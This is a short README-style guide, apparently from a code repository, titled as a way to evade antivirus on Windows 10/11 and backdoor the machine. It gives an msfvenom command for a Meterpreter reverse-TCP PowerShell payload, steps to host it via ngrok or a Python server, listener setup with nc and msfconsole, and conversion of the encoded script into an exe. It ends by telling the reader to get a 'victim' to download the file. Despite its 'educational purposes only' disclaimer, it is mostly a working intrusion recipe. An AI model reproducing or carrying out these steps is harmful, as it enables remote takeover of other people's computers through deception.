# Windows 11/10 Evade AV & Backdoor

#### **NOTE: For educational purposes only!**
#### **NOTE: Some Meterpreter commands may upset Defender.**
#### **NOTE: Defender Smart screen still alerts of potential virus.**

## Steps to Compromise:

1. **Generate the payload:** <br>
Using meterpreter here, but feel free to play around with it. <br>
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT> -i 2 -e cmd/powershell_base64 -f ps1
4. **Setup server in files directory:** <br>
ngrok tcp 80 or python3 -m http.server 80 <br>
Using ngrok, or python if local
5. **Setup your listener with nc or msfconsole:** <br>
nc -lvnp 9001 <br>
or <br>
msfconsole -q <br>
msf> use multi/handler <br>
msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp <br>
msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55) <br>
msf exploit(handler) > set LPORT <Listening_Port> (for example set LPORT 4444) <br>
msf exploit(handler) > exploit <br>
6. **Base64 encode the trojan.ps1 script.** <br>
trojan.ps1 <br>
7. **Convert our encoded trojan.ps1 into .exe using PS2EXE.** <br>
encoded_trojan.ps1
1. **Setup Trojan Horse.** 
8. **Get creative. Have victim download "exe" file to their machine (i.e through ngrok server, google drive, discord, or other means.)**
  
# Demonstration Video
Insert video in markdown!
